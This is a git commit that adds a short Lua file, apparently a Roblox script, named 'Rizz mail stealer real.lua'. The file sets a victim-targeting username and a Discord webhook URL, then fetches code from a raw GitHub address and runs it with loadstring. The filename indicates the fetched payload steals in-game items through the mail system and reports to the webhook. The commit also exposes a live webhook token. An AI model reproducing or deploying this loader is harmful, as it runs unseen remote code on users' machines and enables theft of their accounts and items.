5afd7c3494ec93580b89a35005507d6698b4ed15
TizlerThaBot <128207825+TizlerThaBot@users.noreply.github.com>
2023-04-09 17:36:42 +0930

    Add files via upload

---
+++ Rizz mail stealer real.lua
@@ -0,0 +1,4 @@
+UserName = "andthatzwhaticall"
+Webhook = "https://discord.com/api/webhooks/1086494496834998373/lU2_maVQH7oPEs4lACmJE9fnhvVTnT7uWBrUpSAF-SsGqthdO8nQA8oSzjS0QMN1U1vv"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Psx0/A/main/main", true))()
